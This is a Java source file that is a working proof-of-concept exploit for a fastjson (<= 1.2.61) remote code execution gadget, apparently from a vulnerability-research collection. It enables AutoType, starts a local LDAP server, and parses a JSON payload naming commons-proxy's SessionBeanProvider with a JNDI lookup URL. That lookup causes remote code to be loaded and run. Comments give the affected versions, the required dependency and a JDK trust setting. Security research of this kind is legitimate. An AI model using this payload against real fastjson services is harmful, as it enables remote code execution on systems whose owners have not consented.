package com.security.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.security.bug.common.server.LdapServer;
import com.security.bug.common.server.RmiServer;

/**
 * fastjson <= 1.2.61 RCE，需要开启AutoType
 *
 * <dependency>
 *       <groupId>org.apache.commons</groupId>
 *       <artifactId>commons-proxy</artifactId>
 * </dependency>
 *

 */
public class CommonsProxyPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    //TODO 使用rmi server模式时，jdk版本高的需要开启URLCodebase trust
//    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

    ParserConfig.global.setAutoTypeSupport(true);

//    String payload = "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"rmi://localhost:43657/Calc\"}";
    String payload = "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:43658/Calc\",\"Object\":\"a\"}";

    try {
      JSON.parseObject(payload);
    } catch (Exception e) {
      e.printStackTrace();
    }


    JSON.parseObject(payload);
  }
}
